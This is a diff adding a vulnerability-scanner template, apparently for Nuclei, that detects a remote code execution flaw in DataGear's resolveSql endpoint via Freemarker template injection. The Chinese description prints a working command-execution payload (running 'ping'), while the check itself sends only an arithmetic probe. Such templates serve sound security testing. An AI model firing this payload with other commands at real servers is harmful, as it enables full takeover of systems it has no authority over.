@@ -1,0 +1,32 @@
+id: datagear-resolvesql-rce
+
+info:
+  name: DataGear resolveSql 组件远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    DataGear 是一个开源数据可视化分析平台，允许用户创建自定义数据看板，并支持多种数据源接入，包括 SQL、CSV、Excel、HTTP 接口和 JSON。
+      
+      通过 resolveSql 组件存在远程代码执行漏洞，攻击者可利用 Freemarker 模板注入机制执行任意系统命令。验证载荷示例：
+          {"sql": "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"ping www.baidu.com\")}"}
+      
+      该漏洞利用链可导致目标系统被完全控制，受影响组件未进行模板引擎安全沙箱限制。漏洞公开日期为 2024-11-13
+  tags: DataGear
+
+http:
+- raw:
+  - |
+    POST /dataSet/resolveSql HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+
+    {"sql": "${111*222}"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '24642'
